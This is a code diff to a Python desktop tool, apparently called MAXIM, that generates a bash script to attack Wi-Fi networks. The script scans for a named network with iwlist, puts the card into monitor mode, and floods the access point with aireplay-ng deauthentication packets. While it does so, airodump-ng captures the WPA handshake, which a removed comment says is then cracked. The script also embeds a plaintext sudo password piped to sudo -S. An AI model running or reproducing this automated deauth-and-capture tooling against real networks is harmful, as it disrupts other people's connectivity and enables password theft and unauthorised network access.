@@ -1098,84 +1098,64 @@ class MaximWindow(QMainWindow):
         except FileNotFoundError:
             pass
 
-        # ── All-in-one bash script: everything runs in the external terminal ──
-        # Phase 1: airodump-ng scans ALL networks (user sees them in terminal)
-        #          A background loop watches the CSV for our target ESSID
-        #          When found → kills the scan → starts targeted capture + deauth
-        # Phase 2: MAXIM Python poller detects valid .cap → kills terminal → cracks
+        # ── Use iwlist scan (managed mode) to find BSSID+channel, then monitor+capture ──
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
         script.write(f"rm -f '{signal_file}'\n\n")
 
-        # Monitor mode
+        # Ensure managed mode for iwlist scan
+        script.write(f"echo '[*] Preparing {iface} for scan...'\n")
+        script.write(f"sudo airmon-ng check kill 2>/dev/null\n")
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
+        script.write(f"sudo iw dev {iface} set type managed 2>/dev/null\n")
         script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
-        script.write(f"MON={iface}\n")
-        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n\n")
+        script.write("sleep 2\n\n")
 
-        scan_csv = "/tmp/maxim_hscan"
-        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n\n")
-
-        # Background watcher: polls the CSV file for our ESSID, extracts BSSID+channel
-        # When found, writes to a signal file and kills the foreground airodump
-        finder_signal = "/tmp/maxim_found_target"
-        script.write(f"rm -f '{finder_signal}'\n")
-        script.write("(\n")
-        script.write("  sleep 5\n")  # give airodump time to write first CSV
-        script.write("  for attempt in $(seq 1 60); do\n")  # try for 5 minutes
-        # Find the latest CSV file written by airodump
-        script.write(f"    CSV=$(ls -t {scan_csv}-*.csv 2>/dev/null | head -1)\n")
-        script.write("    if [ -n \"$CSV\" ]; then\n")
-        # In airodump CSV, AP lines start with MAC address and have ESSID as last field
-        # Format: BSSID, First time, Last time, channel, Speed, Privacy, Cipher, Auth, Power, #beacons, #IV, LAN IP, ID-length, ESSID, Key
-        script.write(f"      LINE=$(grep -i '{essid}' \"$CSV\" | grep -E '^[0-9A-Fa-f]{{2}}:' | head -1)\n")
-        script.write("      if [ -n \"$LINE\" ]; then\n")
-        script.write("        BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
-        # Channel is field 4 in airodump CSV
-        script.write("        CH=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
-        # Validate channel is positive number
-        script.write("        if echo \"$CH\" | grep -qE '^-?[0-9]+$'; then\n")
-        script.write("          CH=${CH#-}\n")  # strip leading minus if present
-        script.write("        fi\n")
-        script.write("        if echo \"$CH\" | grep -qE '^[0-9]+$' && [ \"$CH\" -ge 1 ] 2>/dev/null && [ \"$CH\" -le 165 ] 2>/dev/null; then\n")
-        script.write(f"          echo \"$BSSID $CH\" > '{finder_signal}'\n")
-        script.write("          kill $(pgrep -f 'airodump-ng.*maxim_hscan') 2>/dev/null\n")
-        script.write("          exit 0\n")
-        script.write("        fi\n")
-        script.write("      fi\n")
+        # iwlist scan — output looks like:
+        #   Cell 01 - Address: AA:BB:CC:DD:EE:FF
+        #             Channel:6
+        #             ESSID:"MAX"
+        # Parse with simple grep/sed
+        script.write("BSSID=''\nCHANNEL=''\n")
+        script.write(f"echo '[*] Scanning for {essid}...'\n")
+        script.write("for i in 1 2 3 4 5 6 7 8 9 10; do\n")
+        script.write(f"  echo \"  Attempt $i/10\"\n")
+        script.write(f"  DUMP=$(sudo iwlist {iface} scan 2>/dev/null)\n")
+        # Find the Cell block containing our ESSID, extract Address and Channel
+        # Strategy: dump to temp file, use grep -B to get lines before ESSID match
+        script.write(f"  echo \"$DUMP\" > /tmp/maxim_iwlist.txt\n")
+        # Get line number of our ESSID
+        script.write(f"  ESSID_LINE=$(grep -n 'ESSID:\"{essid}\"' /tmp/maxim_iwlist.txt | head -1 | cut -d: -f1)\n")
+        script.write("  if [ -n \"$ESSID_LINE\" ]; then\n")
+        # Search backwards from ESSID line for Address and Channel
+        script.write("    BLOCK=$(head -n $ESSID_LINE /tmp/maxim_iwlist.txt | tail -n 20)\n")
+        script.write("    BSSID=$(echo \"$BLOCK\" | grep 'Address:' | tail -1 | sed 's/.*Address: //')\n")
+        script.write("    CHANNEL=$(echo \"$BLOCK\" | grep 'Channel:' | tail -1 | sed 's/.*Channel://')\n")
+        script.write("    if [ -n \"$BSSID\" ] && [ -n \"$CHANNEL\" ]; then\n")
+        script.write("      echo \"  FOUND: BSSID=$BSSID  Channel=$CHANNEL\"\n")
+        script.write("      break\n")
         script.write("    fi\n")
-        script.write("    sleep 3\n")
-        script.write("  done\n")
-        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
-        script.write(") &\n")
-        script.write("WATCHER_PID=$!\n\n")
+        script.write("  fi\n")
+        script.write("  sleep 2\n")
+        script.write("done\n")
+        script.write("rm -f /tmp/maxim_iwlist.txt\n\n")
 
-        # Foreground: airodump-ng scans ALL channels, user sees everything in terminal
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
-        script.write(f"echo '  Scanning for: {essid}'\n")
-        script.write("echo '  Will auto-switch to capture when found...'\n")
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
-        script.write("echo\n")
-        script.write(f"sudo airodump-ng -w '{scan_csv}' --output-format csv,pcap --write-interval 1 $MON\n\n")
-
-        # When airodump exits (killed by watcher or user), check if target was found
-        script.write(f"if [ ! -f '{finder_signal}' ]; then\n")
-        script.write("  kill $WATCHER_PID 2>/dev/null\n")
-        script.write(f"  echo 'Target {essid} not found.'\n")
+        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
+        script.write(f"  echo '[!] Could not find {essid} after 10 scans'\n")
         script.write(f"  echo 'FAILED' > '{signal_file}'\n")
         script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
 
-        # Read BSSID and channel from signal file
-        script.write(f"BSSID=$(cat '{finder_signal}' | cut -d' ' -f1)\n")
-        script.write(f"CHANNEL=$(cat '{finder_signal}' | cut -d' ' -f2)\n")
-        script.write(f"rm -f '{finder_signal}'\n")
-        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n\n")
+        # Switch to monitor mode
+        script.write(f"echo '[*] Switching to monitor mode...'\n")
+        script.write(f"sudo ip link set {iface} down\n")
+        script.write(f"sudo iw dev {iface} set type monitor\n")
+        script.write(f"sudo ip link set {iface} up\n")
+        script.write(f"MON={iface}\n\n")
 
-        # Now do targeted capture + deauth
-        script.write("clear\n")
+        # Targeted capture + deauth
+        script.write("echo\n")
         script.write("echo '══════════════════════════════════════════════════════════'\n")
         script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
         script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
@@ -1188,7 +1168,7 @@ class MaximWindow(QMainWindow):
         script.write("    sudo aireplay-ng --deauth 10 -a $BSSID $MON >/dev/null 2>&1\n")
         script.write("    sleep 4\n  done\n) &\n\n")
 
-        # Capture in foreground — user sees handshake notification in terminal
+        # Capture in foreground
         script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
         script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
 
